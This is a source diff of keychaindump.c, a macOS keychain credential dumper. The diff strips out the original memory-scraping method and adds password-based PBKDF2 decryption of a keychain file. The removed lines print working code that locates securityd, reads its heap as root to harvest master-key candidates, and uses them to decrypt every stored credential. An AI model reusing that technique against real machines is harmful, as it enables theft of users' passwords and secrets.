@@ -2,15 +2,13 @@
 // $ gcc keychaindump.c -o keychaindump -lcrypto
 
 // Usage:
-// $ sudo ./keychaindump [path to keychain file, leave blank for default]
+// $ ./keychaindump <path to keychain file>
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <mach/mach.h>
-#include <mach/vm_map.h>
 #include <openssl/des.h>
-#include <sys/sysctl.h>
+#include <openssl/evp.h>
 
 // This structure's fields are pieced together from several sources,
 // using the label as an identifier. See find_or_create_credentials.
@@ -31,127 +29,6 @@ typedef struct t_credentials {
 
 t_credentials *g_credentials = 0;
 int g_credentials_count = 0;
-char **g_master_candidates = 0;
-int g_master_candidates_count = 0;
-
-// Writes a hex representation of the bytes in src to the dst buffer.
-// The dst buffer must be at least len*2+1 bytes in size.
-void hex_string(char *dst, char *src, size_t len) {
-    int i;
-    for (i = 0; i < len; ++i) {
-        sprintf(dst+i*2, "%02x", (unsigned char)src[i]);
-    }
-}
-
-// Saves a 24-byte sequence that might be a valid master key in the
-// global list. Checks the existing list first to avoid duplicates.
-void add_master_candidate(char *key) {
-    if (!g_master_candidates) {
-        g_master_candidates = malloc(MAX_MASTER_CANDIDATES * sizeof(char *));
-    }
-    
-    // Key already known?
-    int i;
-    for (i = 0; i < g_master_candidates_count; ++i) {
-        if (!memcmp(key, g_master_candidates[i], 24)) return;
-    }
-    
-    if (g_master_candidates_count < MAX_MASTER_CANDIDATES) {
-        char *new = malloc(24);
-        memcpy(new, key, 24);
-        g_master_candidates[g_master_candidates_count++] = new;
-    } else {
-        printf("[-] Too many candidate keys to fit in memory\n");
-        exit(1);
-    }
-}
-
-// Enumerates the system's process list to find the PID of securityd.
-int get_securityd_pid() {
-    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
-    
-    size_t sz;
-    sysctl(mib, 4, NULL, &sz, NULL, 0);
-
-    struct kinfo_proc *procs = malloc(sz);
-    sysctl(mib, 4, procs, &sz, NULL, 0);
-
-    int proc_count = sz / sizeof(struct kinfo_proc);
-    int i, pid = 0;
-    for (i = 0; i < proc_count; ++i) {
-        struct kinfo_proc *proc = &procs[i];
-        if (!strcmp("securityd", proc->kp_proc.p_comm)) {
-            pid = proc->kp_proc.p_pid;
-            break;
-        }
-    }
-    
-    free(procs);
-    return pid;
-}
-
-// Searches a memory range for anything that looks like a master encryption key
-// and stores each found candidate in the global list of possible master keys.
-void search_for_keys_in_task_memory(mach_port_name_t task, vm_address_t start, vm_address_t stop) {
-    size_t sz = stop - start;
-    char *buffer = malloc(sz);
-    if (!buffer) {
-        printf("[-] Could not allocate memory for key search\n");
-        exit(1);
-    }
-    
-    size_t read_sz;
-    
-    kern_return_t r = vm_read_overwrite(task, start, sz, (vm_address_t)buffer, &read_sz);
-    if (sz != read_sz) printf("[-] Requested %lu bytes, got %lu bytes\n", sz, read_sz);
-
-    if (r == KERN_SUCCESS) {
-        int i;
-        for (i = 0; i < read_sz - sizeof(unsigned long int); i += 4) {
-            unsigned long int *p = (unsigned long int *)(buffer + i);
-            
-            // Look for an 8-byte size field with value 0x18, followed by an 8-byte
-            // pointer to the same memory range we are currently inspecting. Use
-            // the value the pointer points to as a candidate master key.
-            if (*p == 0x18) {
-                vm_address_t address = *(p + 1);
-                if (address >= start && address <= stop) {
-                    char key[24 + 1];
-                    key[24] = 0;
-                    memcpy(key, buffer + address - start, 24);
-                    add_master_candidate(key);
-                }
-            }
-        }
-    } else {
-        printf("[-] Error (%i) reading task memory @ %p\n", r, (void *)start);
-    }
-    
-    free(buffer);
-}
-
-// Uses vmmap to enumerate memory ranges where the keys might be hidden
-// and then searches each range individually for candidate master keys.
-void search_for_keys_in_process(int pid) {
-    mach_port_name_t task;
-    task_for_pid(current_task(), pid, &task);
-    
-    char cmd[128];
-    snprintf(cmd, 128, "vmmap %i", pid);
-    
-    FILE *p = popen(cmd, "r");
-    
-    char line[512];
-    vm_address_t start, stop;
-    while (fgets(line, 512, p)) {
-        if(sscanf(line, "MALLOC_TINY %lx-%lx", &start, &stop) == 2) {
-            printf("[*] Searching process %i heap range 0x%lx-0x%lx\n", pid, start, stop);
-            search_for_keys_in_task_memory(task, start, stop);
-        }
-    }
-    
-    pclose(p);
-}
 
 // Returns an Apple Database formatted 32-bit integer from the given address.
 int atom32(char *p) {
@@ -227,7 +104,7 @@ size_t decrypt_3des(char *in, size_t len, char *out, char *key, char* iv) {
 // Returns 0 if unsuccessful, 24 otherwise. The decrypted key is written
 // to the "out" buffer, if valid. May produce false positives, as the
 // 3DES padding is not a 100% reliable way to check validity.
-int dump_wrapping_key(char *out, char *master, char *buffer, size_t sz) {
+int dump_wrapping_key(char *out, char *password, char *buffer, size_t sz) {
     char magic[] = "\xfa\xde\x07\x11";
     int offset;
     
@@ -244,7 +121,14 @@ int dump_wrapping_key(char *out, char *master, char *buffer, size_t sz) {
     
     char iv[8];
     memcpy(iv, blob + 64, 8);
-    
+
+    char salt[20];
+    memcpy(salt, blob + 44, 20);
+
+    char master[24];
+    int result = PKCS5_PBKDF2_HMAC_SHA1(password, strlen(password), salt, 20, 1000, 24, master);
+    if (result != 1) return 0;
+
     char key[48];
     int ciphertext_offset = atom32(blob + 8);
     size_t key_len = decrypt_3des(blob + ciphertext_offset, 48, key, master, iv);
@@ -438,33 +322,12 @@ void print_credentials() {
 }
 
 int main(int argc, char **argv) {
-    // Phase 1. Search securityd's memory space for possible master keys.
-    // If the keychain file is unlocked, the real key should be in memory.
-    int pid = get_securityd_pid();
-    if (!pid) {
-        printf("[-] Could not find the securityd process\n");
-        exit(1);
-    }
-    
-    if (geteuid()) {
-        printf("[-] No root privileges, please run with sudo\n");
-        exit(1);
-    }
-    
-    search_for_keys_in_process(pid);
-    
-    printf("[*] Found %i master key candidates\n", g_master_candidates_count);
-    
-    if (!g_master_candidates_count) exit(1);
-    
-    // Phase 2. Try decrypting the wrapping key with each master key candidate
-    // to see which one gives a valid result.
-    char filename[512];
     if (argc < 2) {
-        sprintf(filename, "%s/Library/Keychains/login.keychain", getenv("HOME"));
-    } else {
-        sprintf(filename, "%s", argv[1]);
+        printf("[-] usage: %s <keychain>\n", argv[0]);
+        exit(1);
     }
+
+    char *filename = argv[1];
     
     FILE *f = fopen(filename, "rb");
     if (!f) {
@@ -478,31 +341,25 @@ int main(int argc, char **argv) {
     rewind(f);
     fread(buffer, 1, sz, f);
     fclose(f);
-    
-    printf("[*] Trying to decrypt wrapping key in %s\n", filename);
 
-    char key[24];
-    int i, key_len = 0;
-    for (i = 0; i < g_master_candidates_count; ++i) {
-        char s_key[24*2+1];
-        hex_string(s_key, g_master_candidates[i], 24);
-        printf("[*] Trying master key candidate: %s\n", s_key);
-        if (key_len = dump_wrapping_key(key, g_master_candidates[i], buffer, sz)) {
-            printf("[+] Found master key: %s\n", s_key);
-            break;
-        }
-    }
-    if (!key_len) {
-        printf("[-] None of the master key candidates seemed to work\n");
+    char password[1024];
+    printf("[*] Enter password (will be echoed!): ");
+    if (!fgets(password, 1024, stdin)) {
+        printf("[-] fgets error\n");
         exit(1);
     }
 
-    char s_key[24*2+1];
-    hex_string(s_key, key, 24);
-    printf("[+] Found wrapping key: %s\n", s_key);
-    
-    // Phase 3. Using the wrapping key, dump all credentials from the keychain
-    // file into the global credentials list and decrypt everything.
+    // Remove trailing \n
+    int len = strlen(password);
+    if (password[len-1] == '\n')
+        password[len-1] = 0;
+
+    char key[24];
+    if (!dump_wrapping_key(key, password, buffer, sz)) {
+        printf("[-] Invalid password\n");
+        exit(1);
+    }
+
     dump_keychain(key, buffer);
     decrypt_credentials();
     print_credentials();
